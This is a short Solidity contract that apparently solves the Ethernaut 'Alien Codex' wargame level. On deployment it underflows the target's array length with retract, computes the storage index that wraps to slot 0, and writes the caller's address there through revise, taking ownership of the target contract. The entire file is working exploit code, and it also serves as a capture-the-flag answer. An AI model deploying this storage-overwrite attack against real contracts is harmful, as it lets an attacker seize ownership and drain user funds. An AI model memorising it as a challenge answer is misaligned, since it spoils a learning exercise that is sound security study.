// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../alienCodex/AlienCodex.sol';

contract AlienCodexHack {
  AlienCodex  alienCodex;

  constructor (address instance) public {
    alienCodex = AlienCodex(instance);
    alienCodex.make_contact();
    alienCodex.retract();
    uint256 MIN;
    uint256 MAX = ~MIN;
    uint256 loc = MAX - uint256(keccak256(abi.encode(1))) + 1;
    alienCodex.revise(loc, bytes32(bytes20(address(msg.sender))) >> 96);
  }
}